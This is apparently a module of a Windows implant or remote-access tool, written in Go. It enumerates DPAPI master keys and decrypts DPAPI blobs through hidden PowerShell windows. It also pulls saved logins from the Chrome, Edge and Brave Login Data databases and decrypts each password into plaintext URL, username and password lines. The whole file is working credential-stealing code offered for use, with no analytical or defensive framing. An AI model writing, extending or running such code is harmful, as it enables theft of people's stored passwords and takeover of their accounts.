//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func dpapiMasterKey() (string, error) {
	protectDir := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Protect")
	sidDir := ""
	entries, err := os.ReadDir(protectDir)
	if err != nil {
		protectDir = filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Microsoft", "Protect")
		entries, err = os.ReadDir(protectDir)
		if err != nil {
			return "", fmt.Errorf("Cannot find Protect directory: %v", err)
		}
	}

	var masterKeys []string
	for _, e := range entries {
		if e.IsDir() {
			sidDir = filepath.Join(protectDir, e.Name())
			mkEntries, _ := os.ReadDir(sidDir)
			for _, mk := range mkEntries {
				if !mk.IsDir() && strings.EqualFold(filepath.Ext(mk.Name()), "") {
					masterKeys = append(masterKeys, filepath.Join(sidDir, mk.Name()))
				}
			}
		}
	}

	if sidDir == "" {
		return "", fmt.Errorf("No Protect subdirectory found (SID folder)")
	}

	result := fmt.Sprintf("DPAPI MasterKey directory: %s\n", sidDir)
	for _, mk := range masterKeys {
		info, _ := os.Stat(mk)
		result += fmt.Sprintf("  %s (%d bytes)\n", mk, info.Size())
	}
	if len(masterKeys) == 0 {
		result += "  (no master key files found)\n"
	}
	return result, nil
}

func dpapiBlob(filePath string) (string, error) {
	if filePath == "" {
		return "", fmt.Errorf("usage: dpapi_blob <filepath>")
	}
	data, err := os.ReadFile(filePath)
	if err != nil {
		return "", fmt.Errorf("read file: %v", err)
	}
	b64Data := base64.StdEncoding.EncodeToString(data)
	ps := fmt.Sprintf(`[System.Reflection.Assembly]::LoadWithPartialName("System.Security"); $b=[Convert]::FromBase64String("%s"); try { $r=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser); Write-Output ([Convert]::ToBase64String($r)) } catch { Write-Output "UNPROTECT_FAILED: $_" }`, b64Data)
	c := exec.Command("powershell", "-NoP", "-NonI", "-Command", ps)
	applyHideWindow(c)
	out, err := c.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("powershell: %v", err)
	}
	result := strings.TrimSpace(string(out))
	if strings.Contains(result, "UNPROTECT_FAILED") {
		return result, fmt.Errorf("CryptUnprotectData failed (maybe wrong user context)")
	}
	return fmt.Sprintf("Decrypted blob (%d bytes raw):\n%s\n", len(data), result), nil
}

func dpapiBrowser() (string, error) {
	var results []string
	browsers := []struct {
		Name     string
		LocalState string
		LoginData  string
	}{
		{"Chrome", `%LOCALAPPDATA%\Google\Chrome\User Data\Local State`, `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data`},
		{"Edge", `%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State`, `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data`},
		{"Brave", `%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Local State`, `%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Login Data`},
	}

	for _, b := range browsers {
		ls := os.ExpandEnv(b.LocalState)
		ld := os.ExpandEnv(b.LoginData)
		lsInfo, lsErr := os.Stat(ls)
		ldInfo, ldErr := os.Stat(ld)
		found := ""
		if lsErr == nil {
			found += fmt.Sprintf("  LocalState: %s (%d bytes)\n", ls, lsInfo.Size())
		}
		if ldErr == nil {
			_ = ldInfo
			ps := fmt.Sprintf(`$f='%s';$c=Get-Content $f -Raw;$r=@();[void][Reflection.Assembly]::LoadWithPartialName('System.Security');try{$m=Get-ItemProperty '%s\Microsoft\Protect\*\*' -Name dpapi|select -ExpandProperty dpapi}catch{}; Add-Type -AssemblyName System.Data.SQLite; try { $conn=New-Object System.Data.SQLite.SQLiteConnection("Data Source=$f");$conn.Open();$cmd=$conn.CreateCommand();$cmd.CommandText='SELECT origin_url,username_value,password_value FROM logins';$rdr=$cmd.ExecuteReader(); while($rdr.Read()){ $o=$rdr["origin_url"];$u=$rdr["username_value"];$p=[System.Security.Cryptography.ProtectedData]::Unprotect($rdr["password_value"],$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser); $r+=("$o|$u|$([Text.Encoding]::UTF8.GetString($p))") }; $conn.Close() } catch { $r+="DECRYPT_FAIL: $_" }; Write-Output ($r -join [Environment]::NewLine)`, ld, os.Getenv("APPDATA"))
			c := exec.Command("powershell", "-NoP", "-NonI", "-Command", ps)
			applyHideWindow(c)
			out, _ := c.CombinedOutput()
			if len(out) > 0 {
				found += "  Passwords:\n"
				lines := strings.Split(string(out), "\n")
				for _, line := range lines {
					line = strings.TrimSpace(line)
					if line != "" {
						found += "    " + line + "\n"
					}
				}
			}
		}
		if found != "" {
			results = append(results, fmt.Sprintf("=== %s ===\n%s", b.Name, found))
		}
	}

	if len(results) == 0 {
		return "No browser credential stores found.\n", nil
	}
	return strings.Join(results, "\n"), nil
}
